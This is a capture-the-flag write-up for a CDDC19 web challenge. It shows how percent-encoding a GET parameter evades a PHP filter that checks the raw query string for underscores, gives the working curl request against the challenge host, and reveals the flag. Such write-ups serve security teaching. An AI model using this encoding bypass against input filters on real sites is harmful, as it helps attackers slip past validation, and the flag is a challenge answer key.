# `\'_'/`
Web

## Challenge 

	DESCRIPTION
	\'_'/

	http://가나다라마바사아자차카타파하.cddc19q.ctf.sg/

	ATTACHED FILES
	None

## Solution

We see the source code on the website

    <?php
    show_source(__FILE__);

    include_once("flag.php");

    if( strpos($_SERVER["QUERY_STRING"], '_') != false )
            exit("\'_'/");

    if( stripos($_SERVER["QUERY_STRING"], '_') != false )
            exit("\'_'/");

    if( strrpos($_SERVER["QUERY_STRING"], '_') != false )
            exit("\'_'/");

    if( strripos($_SERVER["QUERY_STRING"], '_') != false )
            exit("\'_'/");

    if( strstr($_SERVER["QUERY_STRING"], '_') != false )
            exit("\'_'/");

    if( strpbrk($_SERVER["QUERY_STRING"], '_') != false )
            exit("\'_'/");

    if( preg_match("/[a-z][0-9._]/", $_SERVER["QUERY_STRING"]) )
            exit("\'_'/");

    if( preg_match("/ABCDEFGHIJKLMNOPQRSTUVWXYZ/", $_SERVER["QUERY_STRING"]) )
            exit("\'_'/");

    if( isset($_GET["_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_"]) ) {
            if( $_GET['_1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_'] == "🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️" )
                    echo $FLAG;
    }
    ?>

We need to make the following get request

    Parameter: _1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_
    Value: 🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️

However, there are many if statements which prevent our parameter from going through.

I found a good reference for PHP tricks. 

- https://github.com/w181496/Web-CTF-Cheatsheet#php-tag
- https://brownfly.github.io/2019/02/15/Hgame2019%20Web%20WriteUp/

Here's an example of URL decoding

    Example:
    Request: http://kaibro.tw/test.php?url=%67%67
    $_GET: [url] => gg
    $_SERVER['REQUEST_URI']: /test.php?url=%67%67
    $_SERVER['QUERY_STRING']: url=%67%67

Hence, if we were to encode everything, then we can bypass the checks.

In Chrome or any modern browser, the browser automatically decodes it for us before sending the request, hence we must do it through CURL.

We are provided with a URL with Unicode. We need to convert it to ASCII URL so that we can use in CURL.

    http://가나다라마바사아자차카타파하.cddc19q.ctf.sg/

In Chrome, I went into developer tools and viewed the page request. This gave me the ASCII URL.

    http://xn--o39a40go4bowh99c2uehzk2qjhlf9xn2kgvthokihti.cddc19q.ctf.sg/

Next, I encoded the parameter by converting to hex and then adding the percent symbols.

    Original: _1234567890-ABCDEFGHIJKLMNOPQRSTUVWXYZ-qwertyuiopasdfghjklzxcvbnm_
    Hex Encoded: 5f313233343536373839302d4142434445464748494a4b4c4d4e4f505152535455565758595a2d71776572747975696f706173646667686a6b6c7a786376626e6d5f
    URL Encoded: %5f%31%32%33%34%35%36%37%38%39%30%2d%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%2d%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%5f

And since in CURL, we can't use Unicode, I had to convert the Emojis into URL encoding too. We can do [this in CyberChef](https://gchq.github.io/CyberChef/).

    Original: 🚣‍♀️ 🚣🏻‍♀️ 🚣🏼‍♀️ 🚣🏽‍♀️ 🚣🏾‍♀️ 🚣🏿‍♀️ 🚣‍♂️ 🚣🏻‍♂️ 🚣🏼‍♂️ 🚣🏽‍♂️ 🚣🏾‍♂️ 🚣🏿‍♂️
    URL Encoded: %F0%9F%9A%A3%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BB%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BC%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BD%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BE%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BF%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BB%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BC%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BD%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BE%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BF%E2%80%8D%E2%99%82%EF%B8%8F

Now we get the CURL request as follows.

    $ curl "http://xn--o39a40go4bowh99c2uehzk2qjhlf9xn2kgvthokihti.cddc19q.ctf.sg/?%5f%31%32%33%34%35%36%37%38%39%30%2d%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%2d%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%5f=%F0%9F%9A%A3%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BB%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BC%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BD%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BE%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BF%E2%80%8D%E2%99%80%EF%B8%8F%20%F0%9F%9A%A3%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BB%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BC%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BD%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BE%E2%80%8D%E2%99%82%EF%B8%8F%20%F0%9F%9A%A3%F0%9F%8F%BF%E2%80%8D%E2%99%82%EF%B8%8F"

## Flag

    $CDDC19${PHP_tricks_are_very_fun!}
